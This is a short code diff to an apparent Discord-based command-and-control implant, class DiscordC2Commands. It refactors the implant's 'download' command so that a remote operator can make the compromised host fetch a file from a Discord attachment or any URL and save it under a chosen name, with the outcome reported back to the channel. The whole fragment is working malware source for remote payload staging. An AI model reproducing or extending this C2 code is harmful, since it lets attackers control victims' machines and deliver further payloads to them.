@@ -54,23 +54,18 @@ public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
     }
 
     [Command("download", RunMode = RunMode.Async)]
-    public async Task Download(string filename)
+    public async Task Download(string filename, string url = null)
     {
-        if (Context.Message.Attachments.Count == 0)
+        if (Context.Message.Attachments.Count != 0)
         {
+            url = Context.Message.Attachments.First().Url;
+        } else if (url == null) {
             await Context.Message.Channel.SendMessageAsync("Attach a file or include a URL");
             return;
         }
-        string url = Context.Message.Attachments.First().Url;
         await Context.Message.Channel.SendMessageAsync(Utils.DownloadFile(url, filename));
+        return;
     }
     
-    [Command("download", RunMode = RunMode.Async)]
-    public async Task Download(string url, string filename)
-    {
-        await Context.Message.Channel.SendMessageAsync(Utils.DownloadFile(url, filename));
-    }
-
-
 }
 
